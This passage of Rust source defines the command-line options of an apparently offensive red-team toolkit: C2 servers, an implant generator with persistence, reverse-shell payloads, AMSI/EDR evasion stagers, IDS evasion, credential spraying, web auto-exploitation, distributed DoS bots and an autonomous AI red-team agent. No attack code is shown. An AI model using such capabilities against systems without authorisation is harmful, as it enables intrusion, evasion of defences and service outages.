    export_api_report: bool,

    // ---------- Outils utilitaires ----------
    #[arg(
        long,
        default_value_t = false,
        help = "Update cve_db.json from NVD API v2 (requires internet)"
    )]
    update_cve_db: bool,

    #[arg(
        long,
        default_value_t = false,
        help = "Check environment: config files, deps, API keys"
    )]
    doctor: bool,

    #[arg(
        long,
        default_value_t = 20,
        value_name = "N",
        help = "Max parallel scan workers (default 20)"
    )]
    parallel: usize,

    #[arg(
        long,
        default_value_t = false,
        help = "Skip interactive confirmation when --run-exploits is active"
    )]
    yes: bool,

    // ---------- Agent IA autonome ----------
    #[arg(
        long,
        default_value_t = false,
        help = "Lancer l'agent IA autonome Red Team (OpenRouter + confirmation + persistance)"
    )]
    ai_agent: bool,

    #[arg(
        long,
        default_value = "identifier les hôtes vulnérables et tenter un premier accès",
        value_name = "GOAL",
        help = "Objectif de la mission pour l'agent IA (ex: 'compromettre le contrôleur de domaine')"
    )]
    objective: String,

    #[arg(
        long,
        value_name = "ID",
        help = "Reprendre une campagne existante par son session-id"
    )]
    session_id: Option<String>,

    #[arg(
        long,
        default_value = "sessions",
        value_name = "DIR",
        help = "Dossier de persistance des campagnes (défaut: ./sessions)"
    )]
    sessions_dir: String,

    #[arg(
        long = "ai-stealth",
        default_value_t = false,
        help = "Mode stealth pour l'agent IA (low & slow, évite les détections IDS)"
    )]
    ai_stealth: bool,

    #[arg(
        long,
        default_value_t = false,
        help = "Forcer la confirmation humaine pour TOUTES les actions de l'agent IA"
    )]
    confirm_all: bool,

    #[arg(
        long = "rl-learn",
        default_value_t = false,
        help = "Activer l'apprentissage par renforcement (RL) sur la kill-chain — la Q-table est persistée entre les campagnes (actif par défaut)"
    )]
    rl_learn: bool,

    #[arg(
        long = "no-rl-learn",
        default_value_t = false,
        help = "Désactiver l'apprentissage par renforcement (RL) — actif par défaut"
    )]
    no_rl_learn: bool,

    #[arg(
        long,
        default_value_t = false,
        help = "Détecter automatiquement la gateway locale et lancer un scan ciblé"
    )]
    scan_local: bool,

    // ---------- Netscan (moteur de scan inspiré nmap) ----------
    #[arg(
        long,
        value_name = "TARGET",
        help = "Moteur de scan réseau inspiré de nmap (IP, hôte ou CIDR) — connect scan parallèle"
    )]
    netscan: Option<String>,

    #[arg(
        long = "netscan-udp",
        default_value_t = false,
        help = "Mode netscan UDP : classification open/closed via ICMP port-unreachable"
    )]
    netscan_udp: bool,

    #[arg(
        long = "discover",
        default_value_t = false,
        help = "Mode netscan : découverte d'hôtes (TCP ping) sur la cible/CIDR, sans scan de ports"
    )]
    discover: bool,

    #[arg(
        long,
        default_value_t = 4u8,
        value_name = "0-5",
        help = "Template de timing nmap-like : 0=paranoid furtif … 5=insane agressif (défaut 4)"
    )]
    timing: u8,

    #[arg(
        long = "syn",
        default_value_t = false,
        help = "Mode netscan : scan SYN par paquets bruts (WSL/Linux, root/CAP_NET_RAW requis)"
    )]
    syn: bool,

    #[arg(
        long = "scan-type",
        value_name = "TYPE",
        help = "Mode netscan : technique explicite — connect|udp|syn|fin|null|xmas|ack|maimon|window (les scans bruts exigent WSL/Linux + root)"
    )]
    scan_type: Option<String>,

    #[arg(
        long = "version-detect",
        default_value_t = false,
        help = "Mode netscan : détection de version/CPE des services ouverts (identify_service)"
    )]
    version_detect: bool,

    #[arg(
        long = "os-detect",
        default_value_t = false,
        help = "Mode netscan : empreinte d'OS par lecture du TTL (inférence active)"
    )]
    os_detect: bool,

    #[arg(
        long = "traceroute",
        default_value_t = false,
        help = "Mode netscan : traceroute TTL par sondes UDP brutes (WSL/Linux, root requis)"
    )]
    traceroute: bool,

    #[arg(
        long = "port-range",
        value_name = "A-B",
        help = "Mode netscan : plage de ports explicite (ex: 1-1024) au lieu du top-ports"
    )]
    port_range: Option<String>,

    #[arg(
        long = "scripts",
        value_name = "SPEC",
        help = "Mode netscan : moteur de scripts NSE-like (ex: 'default', 'banner', 'http-title', 'dns-*')"
    )]
    scripts: Option<String>,

    #[arg(
        long = "decoys",
        default_value_t = 0u8,
        value_name = "N",
        help = "Mode netscan : émettre N leurres à source usurpée (RFC 1918) avant chaque sonde SYN"
    )]
    decoys: u8,

    #[arg(
        long = "shuffle",
        default_value_t = false,
        help = "Mode netscan : randomiser l'ordre des ports (contre-mesure anti-IDS/IPS)"
    )]
    shuffle: bool,

    #[arg(
        long = "evasion",
        value_name = "SPEC",
        help = "Mode netscan : évasion réelle via scan SYN — 'fragment,mtu=576,decoys=8,spoof=10.0.0.9,randomize,sport=40000'"
    )]
    evasion: Option<String>,

    // ---------- Bruteforce ----------
    #[arg(
        long,
        default_value_t = false,
        help = "⚠️  Activer le bruteforce de credentials sur les services détectés (FTP, Redis, HTTP, MongoDB, MySQL, PostgreSQL)"
    )]
    brute: bool,

    #[arg(
        long,
        default_value = "quick",
        value_name = "MODE",
        help = "Mode bruteforce : quick (35 paires) | default (500) | stealth (100, lent)"
    )]
    brute_mode: String,

    #[arg(
        long = "brute-users",
        value_name = "FILE",
        help = "Liste d'utilisateurs externe (txt, un par ligne, # = commentaire) — s'ajoute à la liste embarquée"
    )]
    brute_users: Option<String>,

    #[arg(
        long = "brute-passwords",
        value_name = "FILE",
        help = "Liste de mots de passe externe (txt, un par ligne) — s'ajoute à la liste embarquée"
    )]
    brute_passwords: Option<String>,

    #[arg(
        long = "brute-lists-replace",
        default_value_t = false,
        help = "Les fichiers --brute-users/--brute-passwords REMPLACENT les listes embarquées au lieu de s'y ajouter"
    )]
    brute_lists_replace: bool,

    // ---------- Shell / C2 ----------
    #[arg(
        long,
        default_value_t = false,
        help = "Démarrer un listener reverse shell TCP"
    )]
    listen: bool,

    #[arg(
        long,
        default_value = "0.0.0.0",
        value_name = "ADDR",
        help = "Adresse d'écoute pour le listener (défaut: 0.0.0.0)"
    )]
    lhost: String,

    #[arg(
        long,
        default_value_t = 4444u16,
        help = "Port d'écoute pour le listener reverse shell"
    )]
    lport: u16,

    #[arg(
        long,
        default_value_t = false,
        help = "Démarrer le serveur C2 HTTP (beacon polling)"
    )]
    c2_server: bool,

    #[arg(long, default_value_t = 8443u16, help = "Port du serveur C2 HTTP")]
    c2_port: u16,

    #[arg(
        long,
        default_value_t = false,
        help = "Démarrer le serveur C2 WebSocket bidirectionnel (push de tâches sans polling)"
    )]
    ws_c2: bool,

    #[arg(long, default_value_t = 8444u16, help = "Port du serveur C2 WebSocket")]
    ws_c2_port: u16,

    #[arg(
        long,
        default_value_t = false,
        help = "Démarrer le shell interactif WebSocket (contrôle depuis navigateur) — bind 127.0.0.1 uniquement"
    )]
    ws_shell: bool,

    #[arg(
        long,
        default_value_t = 8445u16,
        help = "Port du shell WebSocket (127.0.0.1 seulement)"
    )]
    ws_shell_port: u16,

    #[arg(
        long,
        value_name = "HOST:PORT",
        help = "Générer les payloads beacon WebSocket pour un C2 (ex: 192.168.1.100:8444)"
    )]
    ws_beacon: Option<String>,

    #[arg(
        long,
        value_name = "ID",
        help = "Interagir avec la session shell (ID de session)"
    )]
    interact: Option<usize>,

    #[arg(
        long,
        default_value_t = false,
        help = "Lister les sessions shell actives"
    )]
    sessions: bool,

    #[arg(
        long,
        default_value_t = false,
        help = "Afficher le payload reverse shell pour les cibles"
    )]
    payload: bool,

    #[arg(
        long,
        default_value = "bash",
        value_name = "TYPE",
        help = "Type de payload : bash | python | perl | powershell | nc"
    )]
    payload_type: String,

    // ---------- OSINT ----------
    #[arg(
        long,
        value_name = "DOMAIN",
        help = "Lancer une reconnaissance OSINT passive sur un domaine"
    )]
    osint: Option<String>,

    #[arg(
        long,
        value_name = "KEY",
        help = "Clé API Shodan (ou SHODAN_API_KEY dans .env)"
    )]
    shodan_key: Option<String>,

    #[arg(
        long,
        value_name = "KEY",
        help = "Clé API GitHub pour la recherche de leaks"
    )]
    github_key: Option<String>,

    #[arg(
        long,
        value_name = "KEY",
        help = "Clé API HIBP (HaveIBeenPwned) pour vérification de breaches"
    )]
    hibp_key: Option<String>,

    // ---------- Implant Generator ----------
    #[arg(
        long,
        value_name = "C2_URL",
        help = "Générer un implant Python+PowerShell pour le C2 (ex: http://attacker.com:8443)"
    )]
    gen_implant: Option<String>,

    #[arg(
        long,
        default_value_t = false,
        help = "Ajouter persistance automatique dans l'implant généré (crontab/registry)"
    )]
    implant_persist: bool,

    #[arg(
        long,
        value_name = "DATE",
        help = "Kill date de l'implant au format YYYY-MM-DD"
    )]
    implant_kill_date: Option<String>,

    // ---------- Active Directory ----------
    #[arg(
        long,
        value_name = "DC_IP",
        help = "IP du contrôleur de domaine — active le mode AD"
    )]
    dc_ip: Option<String>,

    #[arg(long, value_name = "DOMAIN", help = "Domaine AD (ex: corp.local)")]
    ad_domain: Option<String>,

    #[arg(
        long,
        value_name = "USER",
        help = "Utilisateur AD pour les attaques Kerberoast/AS-REP"
    )]
    ad_user: Option<String>,

    #[arg(long, value_name = "PASS", help = "Mot de passe AD")]
    ad_pass: Option<String>,

    // ---------- Pivoting ----------
    #[arg(
        long,
        default_value_t = false,
        help = "Démarrer un proxy SOCKS5 local sur --socks-port"
    )]
    socks_proxy: bool,

    #[arg(long, default_value_t = 1080u16, help = "Port du proxy SOCKS5 local")]
    socks_port: u16,

    // ---------- Rapport professionnel ----------
    #[arg(
        long,
        default_value_t = false,
        help = "Générer un rapport de pentest professionnel (HTML + Markdown)"
    )]
    pentest_report: bool,

    #[arg(
        long,
        value_name = "CLIENT",
        help = "Nom du client pour le rapport de pentest"
    )]
    client_name: Option<String>,

    // ---------- Red Team OPSEC ----------
    #[arg(
        long,
        default_value = "default",
        value_name = "MODE",
        help = "Stealth scan pacing: off | default | redteam (pacing jitter + concurency caps)"
    )]
    stealth: String,

    #[arg(
        long,
        default_value = "strict",
        value_name = "LEVEL",
        help = "AI redaction level before LLM upload: strict (default) | light | off"
    )]
    redact_level: String,

    #[arg(long, action = clap::ArgAction::SetTrue,
          help = "Secure-wipe output files (3-pass random overwrite) at end of run")]
    clean_outputs: Option<bool>,

    // ---------- Live Dashboard WebSocket ----------
    #[arg(
        long = "dashboard-live",
        default_value_t = false,
        help = "Lance un serveur WebSockets bind 127.0.0.1:24601 — visualisation LIVE du scan via dashboard.html connecté en WS"
    )]
    dashboard_live: bool,

    #[arg(
        long = "dashboard-port",
        default_value_t = 24601u16,
        value_name = "PORT",
        help = "Port du dashboard live (défaut 24601). Reste BINDÉ SUR 127.0.0.1 SEULEMENT (OPSEC)."
    )]
    dashboard_port: u16,

    #[arg(
        long = "no-dashboard-auto-open",
        default_value_t = false,
        help = "Désactiver l'ouverture automatique du navigateur quand --dashboard-live est utilisé"
    )]
    no_dashboard_auto_open: bool,

    // ---------- Web Attack ----------
    #[arg(
        long,
        value_name = "URL",
        help = "Scanner les injections web : SQLi, XSS, SSRF, LFI, XXE, CMDi, Open Redirect"
    )]
    web_scan: Option<String>,

    #[arg(
        long,
        value_name = "URL",
        help = "Crawler + injection sur une URL (ex: --web-spider https://site)"
    )]
    web_spider: Option<String>,

    #[arg(
        long,
        default_value_t = 30usize,
        help = "Nombre max de pages à crawler (défaut: 30)"
    )]
    spider_pages: usize,

    #[arg(
        long,
        default_value_t = 3usize,
        help = "Profondeur max du spider (défaut: 3)"
    )]
    spider_depth: usize,

    #[arg(
        long,
        value_name = "URL",
        help = "Extraire données via SQLi sur une URL (requiert --web-scan/--web-spider ou URL directe)"
    )]
    sqli_extract: Option<String>,

    #[arg(
        long,
        default_value_t = false,
        help = "⚠️  Exploiter automatiquement les vulns web détectées (SQLi extract + LFI read)"
    )]
    web_exploit: bool,

    #[arg(
        long,
        value_name = "URL",
        help = "URL callback SSRF OOB (ex: http://mon-serveur.com/probe)"
    )]
    ssrf_callback: Option<String>,

    #[arg(
        long,
        value_name = "ADDR",
        help = "Active l'écouteur OOB intégré pour CONFIRMER les vulns aveugles \
                  (SSRF/XXE/command injection). Ex: 127.0.0.1:0 (port aléatoire)"
    )]
    oob_bind: Option<String>,

    #[arg(
        long,
        value_name = "HOST:PORT",
        help = "Adresse joignable par la cible, injectée dans les payloads OOB \
                  (défaut : adresse locale de l'écouteur). Utiliser un tunnel/relais en opération réelle"
    )]
    oob_host: Option<String>,

    #[arg(
        long,
        value_name = "ADDR",
        help = "Active le répondeur DNS OOB (canal de confirmation alternatif, \
                  utile quand la cible bloque les sorties TCP). Ex: 127.0.0.1:5353"
    )]
    oob_dns_bind: Option<String>,

    #[arg(
        long,
        value_name = "DOMAIN",
        help = "Suffixe des payloads DNS OOB : <token>.<DOMAIN>. N'utiliser qu'un \
                  domaine contrôlé par l'opérateur (ou réservé IANA en test)"
    )]
    oob_dns_domain: Option<String>,

    #[arg(
        long,
        value_name = "TOKEN",
        help = "Analyser un JWT (alg:none, weak secret bruteforce, claims manquants)"
    )]
    jwt_analyze: Option<String>,

    #[arg(
        long,
        value_name = "COOKIE",
        help = "Contexte d'auth web : valeur brute de l'en-tête Cookie (ex: 'PHPSESSID=…; csrftoken=…')"
    )]
    cookie: Option<String>,

    #[arg(
        long,
        value_name = "TOKEN",
        help = "Contexte d'auth web : jeton Bearer (Authorization: Bearer <token>)"
    )]
    bearer: Option<String>,

    #[arg(
        long = "header",
        value_name = "K:V",
        help = "En-tête additionnel pour le scan web (répétable, ex: --header 'X-Api-Key: abc')"
    )]
    web_headers: Vec<String>,

    #[arg(
        long = "web-concurrency",
        default_value_t = 16usize,
        help = "Nb de paramètres testés en parallèle par scanner web (défaut: 16)"
    )]
    web_concurrency: usize,

    #[arg(
        long = "no-waf-bypass",
        default_value_t = false,
        help = "Désactiver le rejeu tamper des payloads quand un WAF bloque la requête"
    )]
    no_waf_bypass: bool,

    #[arg(
        long = "retries",
        default_value_t = 2usize,
        help = "Essais par requête web sur erreur réseau transitoire (1 = aucun retry)"
    )]
    web_retries: usize,

    #[arg(
        long = "proxy",
        value_name = "URL",
        help = "Proxy pour le scan web (répétable, ex: --proxy http://127.0.0.1:8080). Round-robin sur le pool."
    )]
    web_proxies: Vec<String>,

    #[arg(
        long = "proxy-file",
        value_name = "FILE",
        help = "Fichier listant un proxy par ligne (commentaires '#' ignorés) pour la rotation"
    )]
    web_proxy_file: Option<String>,

    #[arg(
        long = "web-payloads",
        value_name = "KIND=FILE",
        help = "Liste de payloads externe (txt) fusionnée aux payloads embarqués (répétable). \
                  Familles : sqli, xss, traversal, ssrf, xxe, cmdi, ssti, crlf, params. \
                  Colonnes séparées par TAB (marqueur optionnel, sauf ssti = 3 colonnes). \
                  Ex: --web-payloads sqli=mes_sqli.txt"
    )]
    web_payloads: Vec<String>,

    #[arg(
        long = "web-payloads-replace",
        default_value_t = false,
        help = "Les fichiers --web-payloads REMPLACENT les payloads embarqués de leur famille \
                  au lieu de s'y ajouter"
    )]
    web_payloads_replace: bool,

    #[arg(
        long = "spider-ext",
        value_name = "FILE",
        help = "Extensions statiques supplémentaires à exclure du crawl (txt, une par ligne, \
                  avec ou sans point initial). Ex: .bak .old .sql"
    )]
    spider_ext: Option<String>,

    // ---------- IoT/SCADA ----------
    #[arg(
        long,
        default_value_t = false,
        help = "Scanner protocoles IoT/SCADA : Modbus, Siemens S7, DNP3, BACnet, CoAP, MQTT, EtherNet/IP, OPC-UA"
    )]
    iot_scan: bool,

    // ---------- IPTV / Diffusion média ----------
    #[arg(
        long,
        default_value_t = false,
        help = "Reconnaissance IPTV/média : SSDP-UPnP (DLNA, Smart TV, SAT>IP, Chromecast), flux RTSP, playlists HLS"
    )]
    iptv_scan: bool,

    // ---------- Kerberos / AD avancé ----------
    #[arg(
        long,
        default_value_t = false,
        help = "AS-REP Roasting réel via wire protocol Kerberos (--dc-ip requis)"
    )]
    asrep_roast: bool,

    #[arg(
        long,
        default_value_t = false,
        help = "Kerberoasting via impacket (--dc-ip + --ad-user + --ad-pass requis)"
    )]
    kerberoast: bool,

    #[arg(
        long,
        value_name = "FILE",
        help = "Fichier liste d'utilisateurs (un par ligne) pour kerbrute/spray"
    )]
    userlist: Option<String>,

    #[arg(
        long,
        value_name = "PASSWORD",
        help = "Mot de passe pour password spraying Kerberos"
    )]
    spray_password: Option<String>,

    #[arg(
        long,
        default_value_t = 2000u64,
        help = "Délai ms entre tentatives de spray (défaut 2000ms — évite lockouts)"
    )]
    spray_delay: u64,

    // ---------- Stress Test / GoldenEye DoS ----------
    #[arg(
        long,
        value_name = "URL",
        help = "Lancer un stress test HTTP GoldenEye (DoS de résilience) sur l'URL cible"
    )]
    dos_goldeneye: Option<String>,

    #[arg(
        long,
        default_value = "flood",
        value_name = "MODE",
        help = "Mode attaque moderne: flood | slowloris | rudy | browser (défaut: flood)"
    )]
    dos_mode: String,

    #[arg(
        long,
        default_value_t = 10usize,
        value_name = "N",
        help = "Nombre de workers concurrents (mode Flood legacy, sockets_per_worker >= 50)"
    )]
    dos_workers: usize,

    #[arg(
        long,
        default_value_t = 500usize,
        value_name = "N",
        help = "Sockets ouverts par worker (mode Flood legacy, défaut: 500)"
    )]
    dos_sockets_per_worker: usize,

    #[arg(
        long,
        default_value_t = 50usize,
        value_name = "N",
        help = "Nombre total de BOTS distincts (personas navigateur modernes, modes: slowloris/rudy/browser)"
    )]
    dos_bots: usize,

    #[arg(
        long,
        default_value_t = 200usize,
        value_name = "N",
        help = "Max BOTS concurrents via Tokio semaphore (anti-ulimit, défaut 200)"
    )]
    dos_bots_concurrent: usize,

    #[arg(
        long,
        default_value = "get",
        value_name = "METHOD",
        help = "Méthode HTTP: get | post | random (défaut: get)"
    )]
    dos_method: String,

    #[arg(
        long,
        default_value_t = false,
        help = "Désactiver la vérification SSL/TLS (équivalent --nosslcheck)"
    )]
    dos_nosslcheck: bool,

    #[arg(
        long,
        value_name = "SECONDS",
        help = "Durée maximum du test (0 ou absent = illimité, stopper avec CTRL+C)"
    )]
    dos_duration: Option<u64>,

    #[arg(
        long,
        value_name = "PATH",
        help = "Fichier User-Agents personnalisés (un par ligne, # pour commentaires)"
    )]
    dos_useragents: Option<String>,

    #[arg(
        long,
        default_value_t = 5000u64,
        value_name = "MS",
        help = "Timeout connexion TCP en ms (défaut 5000)"
    )]
    dos_connect_timeout: u64,

    #[arg(
        long,
        default_value_t = 3000u64,
        value_name = "MS",
        help = "Timeout lecture TCP en ms (défaut 3000)"
    )]
    dos_read_timeout: u64,

    #[arg(
        long,
        default_value_t = false,
        help = "Mode verbeux Debug pour GoldenEye (stats détaillées chaque seconde)"
    )]
    dos_debug: bool,

    // ---------- Modern Bot Sophistiqués ----------
    #[arg(
        long,
        default_value_t = false,
        help = "Désactiver rotation automatique identité bot quand WAF détecté (3× 403/429 → new fingerprint)"
    )]
    dos_no_rotate_fingerprint: bool,

    #[arg(
        long,
        default_value_t = false,
        help = "Désactiver envoi Client-Hints (Sec-CH-UA/Platform/Arch/Bitness/Mobile)"
    )]
    dos_no_client_hints: bool,

    #[arg(
        long,
        default_value_t = false,
        help = "Désactiver envoi headers Sec-Fetch-* (mode anti-WAF/CDN)"
    )]
    dos_no_sec_fetch: bool,

    #[arg(
        long,
        default_value_t = false,
        help = "Désactiver header Priority (navigation H2 moderne)"
    )]
    dos_no_priority: bool,

    #[arg(
        long,
        default_value_t = false,
        help = "Activer header Early-Data: 1 (0-RTT, optim anti-RTT pour attaque synchrone)"
    )]
    dos_early_data: bool,

    // ---------- Slowloris & RUDY tuning ----------
    #[arg(
        long,
        default_value_t = 15000u64,
        value_name = "MS",
        help = "Slowloris: délai entre 2 faux headers (défaut 15000 ms)"
    )]
    dos_slowloris_period: u64,

    #[arg(
        long,
        default_value_t = 1usize,
        value_name = "BYTES",
        help = "RUDY: taille du chunk envoyé par intervalle (défaut 1 octet)"
    )]
    dos_rudy_chunk: usize,

    #[arg(
        long,
        default_value_t = 1000u64,
        value_name = "MS",
        help = "RUDY: délai entre 2 chunks (défaut 1000 ms)"
    )]
    dos_rudy_delay: u64,

    #[arg(
        long,
        value_delimiter = ',',
        value_name = "PATH",
        help = "BrowserFlood: liste chemins visités par bots (défaut: /robots.txt,/index,/assets,...)"
    )]
    dos_browser_paths: Option<Vec<String>>,

    // ---------- HORDE Coordinator — infra distribuée bots volumétrique ----------
    #[arg(
        long,
        default_value_t = false,
        help = "⚠️  Lancer le COORDINATOR HORDE (serveur WS + CLI interactive). Workers se connectent."
    )]
    horde_coordinator: bool,

    #[arg(
        long,
        value_name = "URL",
        help = "⚠️  Lancer un WORKER HORDE (ws:// ou wss:// vers coordinator). Ex: wss://10.0.0.1:9443"
    )]
    horde_worker: Option<String>,

    #[arg(
        long,
        default_value = "127.0.0.1",
        value_name = "ADDR",
        help = "Bind HORDE (défaut: 127.0.0.1 OPSEC). Utiliser --horde-public pour 0.0.0.0"
    )]
    horde_bind: String,

    #[arg(
        long,
        default_value_t = 9443u16,
        value_name = "PORT",
        help = "Port écoute Coordinator HORDE (défaut 9443)"
    )]
    horde_port: u16,

    #[arg(
        long,
        default_value_t = false,
        help = "⚠️  Autoriser bind 0.0.0.0 (défaut: refuse) — OPSEC: préférer VPN / Tailscale."
    )]
    horde_public: bool,

    #[arg(
        long,
        value_name = "HEX64",
        help = "Clé maître HORDE 64-hex (fallback env HORDE_MASTER_KEY puis C2_MASTER_KEY)"
    )]
    horde_key: Option<String>,

    #[arg(
        long,
        default_value_t = 1000usize,
        value_name = "N",
        help = "Taille totale cible de la horde en bots (Coordinator seulement; répartis entre workers)"
    )]
    horde_total_bots: usize,

    #[arg(
        long,
        value_name = "SEC",
        help = "Durée max campagne HORDE (None = illimitée, CTRL+C ou horde> stop)"
    )]
    horde_duration: Option<u64>,

    #[arg(
        long,
        default_value = "auto",
        value_name = "auto|off",
        help = "Contrôle adaptatif (réduit intensité si 5xx>30% ou WAF>15%)"
    )]
    horde_adapt: String,

    // ---------- Mission Pack — Persistance campagne chiffrée ----------
    #[arg(
        long,
        value_name = "PATH",
        help = "Créer un pack de mission chiffré AES-256-GCM avec HKDF(SHA256) — chemin du fichier .mission"
    )]
    mission_new: Option<String>,

    #[arg(
        long,
        value_name = "PATH",
        help = "Ouvre un pack de mission existant (.mission) — nécessaire pour --mission-add-note/list/close"
    )]
    mission_open: Option<String>,

    #[arg(
        long,
        value_name = "PASSWORD",
        help = "Mot de passe chiffrement pack (fallback si $env:C2_MASTER_KEY absent — C2_MASTER_KEY recommandé)"
    )]
    mission_password: Option<String>,

    #[arg(
        long,
        value_name = "NAME",
        help = "Nom de la mission (requis pour --mission-new)"
    )]
    mission_name: Option<String>,

    #[arg(
        long,
        value_name = "SCOPE",
        help = "Texte du scope autorisé du client (--mission-new)"
    )]
    mission_scope: Option<String>,

    #[arg(
        long,
        value_delimiter = ',',
        value_name = "TARGET",
        help = "Scope cibles autorisé: IP, CIDR, hostnames (séparés par virgule, --mission-new)"
    )]
    mission_targets: Option<Vec<String>>,

    #[arg(
        long,
        value_name = "OPERATOR",
        help = "Nom de l'opérateur Red Team (mission metadata, defaults à $env:USERNAME)"
    )]
    mission_operator: Option<String>,

    #[arg(
        long,
        default_value_t = false,
        help = "Liste résumé d'un pack ouvert: statistiques + derniers events + risks breakdown"
    )]
    mission_list: bool,

    #[arg(
        long,
        value_name = "TITLE",
        help = "Ajoute une note à un pack ouvert (requiert --mission-open)"
    )]
    mission_add_note: Option<String>,

    #[arg(
        long,
        value_name = "BODY",
        help = "Corps de la note à ajouter (--mission-add-note)"
    )]
    mission_note_body: Option<String>,

    #[arg(
        long,
        value_delimiter = ',',
        value_name = "TAG",
        help = "Tags pour la note (--mission-add-note)"
    )]
    mission_note_tags: Option<Vec<String>>,

    #[arg(
        long,
        default_value_t = false,
        help = "Ferme un pack + NIST SP 800-88 secure wipe 3 passes (0x00, 0xFF, random)"
    )]
    mission_close_wipe: bool,

    #[arg(
        long,
        value_name = "PATH",
        help = "Exporte un pack ouvert en JSON sidecar livrable (anonymisé si redact-level ≥ light)"
    )]
    mission_export_json: Option<String>,

    #[arg(
        long,
        default_value_t = false,
        help = "Sauvegarde automatiquement les nodes d'un scan dans le pack ouvert (--mission-open combiné au scan)"
    )]
    mission_autocapture: bool,

    // ════════════════════════════════════════════════════════════════
    // NOUVEAUX MODULES — Web Avancé
    // ════════════════════════════════════════════════════════════════
    #[arg(
        long,
        value_name = "URL",
        help = "Scanner SSTI (Server-Side Template Injection) — Jinja2/Twig/Freemarker/Mako/ERB"
    )]
    ssti_scan: Option<String>,

    #[arg(
        long,
        value_name = "URL",
        help = "Scanner CORS misconfigurations (origin reflection, null origin, wildcard+credentials)"
    )]
    cors_scan: Option<String>,

    #[arg(
        long,
        value_name = "URL",
        help = "Détecter HTTP Request Smuggling (CL.TE / TE.CL timing-based)"
    )]
    smuggling_scan: Option<String>,

    #[arg(
        long,
        value_name = "URL",
        help = "Scanner endpoint GraphQL (introspection, batching, SQLi, depth attack)"
    )]
    graphql_scan: Option<String>,

    #[arg(
        long,
        value_name = "URL",
        help = "Scanner OAuth2 misconfigurations (redirect_uri, state bypass, implicit flow)"
    )]
    oauth2_scan: Option<String>,

    // ════════════════════════════════════════════════════════════════
    // NOUVEAUX MODULES — Protocoles Réseau Avancés
    // ════════════════════════════════════════════════════════════════
    #[arg(
        long,
        value_name = "HOST",
        help = "Scanner SNMP v1/v2c — brute community strings + MIB dump (UDP/161)"
    )]
    snmp_scan: Option<String>,

    #[arg(
        long,
        value_name = "HOST",
        help = "Scanner IPMI 2.0 — CVE-2013-4786 cipher-zero auth bypass + hash dump (UDP/623)"
    )]
    ipmi_scan: Option<String>,

    #[arg(
        long,
        value_name = "HOST",
        help = "Scanner Kubernetes API — discovery endpoints, RBAC audit, secrets dump"
    )]
    k8s_scan: Option<String>,

    #[arg(
        long,
        value_name = "HOST",
        help = "Scanner MS-RPC (port 135) — endpoint mapper, DCOM enum, WMI, null session"
    )]
    rpc_scan: Option<String>,

    #[arg(
        long,
        value_name = "HOST",
        help = "Scan complet protocoles avancés en parallèle (SNMP+IPMI+K8s+MS-RPC)"
    )]
    advanced_scan: Option<String>,

    // ════════════════════════════════════════════════════════════════
    // NOUVEAUX MODULES — Post-Exploitation
    // ════════════════════════════════════════════════════════════════
    #[arg(
        long,
        value_name = "SESSION_ID",
        help = "Lancer la post-exploitation automatique sur une session shell (credential dump, privesc, réseau)"
    )]
    post_exploit: Option<usize>,

    // ════════════════════════════════════════════════════════════════
    // NOUVEAUX MODULES — Évasion EDR
    // ════════════════════════════════════════════════════════════════
    #[arg(
        long,
        default_value_t = false,
        help = "Générer les stagers d'évasion EDR (AMSI bypass, ETW patch, shellcode encoder polymorphique)"
    )]
    gen_evasion: bool,

    #[arg(
        long,
        default_value = "ForcedError",
        value_name = "VARIANT",
        help = "Variante AMSI bypass: PatchAmsiScanBuffer | SetContextError | ForcedError (défaut: ForcedError)"
    )]
    amsi_variant: String,

    #[arg(
        long,
        value_name = "HEX",
        help = "Encoder un shellcode avec XOR rolling polymorphique (fournir shellcode en hex: 'fc4883...')"
    )]
    encode_shellcode: Option<String>,

    #[arg(
        long,
        default_value_t = 0x37u8,
        value_name = "BYTE",
        help = "Seed XOR pour l'encoder de shellcode (0-255, défaut: 0x37)"
    )]
    encode_seed: u8,

    // ════════════════════════════════════════════════════════════════
    // NOUVEAUX MODULES — MITRE ATT&CK + Reporting
    // ════════════════════════════════════════════════════════════════
    #[arg(
        long,
        default_value_t = false,
        help = "Générer le layer ATT&CK Navigator JSON depuis les findings du dernier scan"
    )]
    attack_layer: bool,

    #[arg(
        long,
        value_name = "DIR",
        help = "Exporter le rapport complet (MD + HTML + JSON + risk matrix + ATT&CK layer) dans un dossier"
    )]
    export_full: Option<String>,

    // ════════════════════════════════════════════════════════════════
    // NOUVEAUX MODULES — SOCKS5 Tunnel
    // ════════════════════════════════════════════════════════════════
    #[arg(
        long,
        value_name = "SESSION_ID",
        help = "Démarrer un tunnel SOCKS5 routé via une session shell active (session_mgr)"
    )]
    socks_via_session: Option<usize>,

    #[arg(
        long,
        value_name = "PORT",
        default_value_t = 1081u16,
        help = "Port local du tunnel SOCKS5 via session (défaut: 1081)"
    )]
    socks_session_port: u16,
}

#[derive(Deserialize, Debug)]
struct ConfigFile {
    targets: Option<Vec<String>>,
    options: Option<ConfigOptions>,
}

#[derive(Deserialize, Debug, Default)]
struct ConfigOptions {
    http_timeout: Option<u64>,
    tcp_timeout: Option<u64>,
    cve_db_path: Option<String>,
    output_file: Option<String>,
    risk_rules_path: Option<String>,
    flows_file: Option<Vec<String>>,
    csv_report: Option<bool>,
    md_report: Option<bool>,
    capture_iface: Option<String>,
    capture_duration: Option<u64>,
    capture_output: Option<String>,
    capture_max_flows: Option<usize>,
    capture_all: Option<bool>,
    promiscuous: Option<bool>,
    capture_bpf: Option<String>,
    log_level: Option<String>,
    log_format: Option<String>,
    log_file: Option<String>,
    exploits_config: Option<String>,
    run_exploits: Option<bool>,
    exploit_depth: Option<String>,
    allow_networks: Option<Vec<String>>,
    max_exploit_impact: Option<String>,
    llm_provider: Option<String>,
    llm_model: Option<String>,
    llm_api_base: Option<String>,
    llm_api_key_env: Option<String>,
    ai_report: Option<bool>,
    ai_targets: Option<usize>,
    export_api_report: Option<bool>,
}

// ---------------------------------------------------------------
// Runtime config blocks returned from loader
// ---------------------------------------------------------------

#[derive(Debug, Clone)]
struct CaptureConfig {
    iface: Option<String>,
    duration: u64,
    output: Option<String>,
    max_flows: usize,
    capture_all: bool,
    promiscuous: bool,
    bpf_filter: Option<String>,
}

#[derive(Debug, Clone)]
struct RuntimeConfig {
    logging: config::LoggingConfig,
    pentest: PentestConfig,
    exploits_path: String,
    llm: Option<LlmConfig>,
    do_ai: bool,
    ai_targets: usize,
    do_api_report: bool,
}

fn clamp_timeout(value: u64, min: u64, max: u64) -> u64 {
    value.clamp(min, max)
}

/// Resolve a config file path: if the given path does not exist as-is and it is
/// a bare filename (no directory component), search upward from the executable's
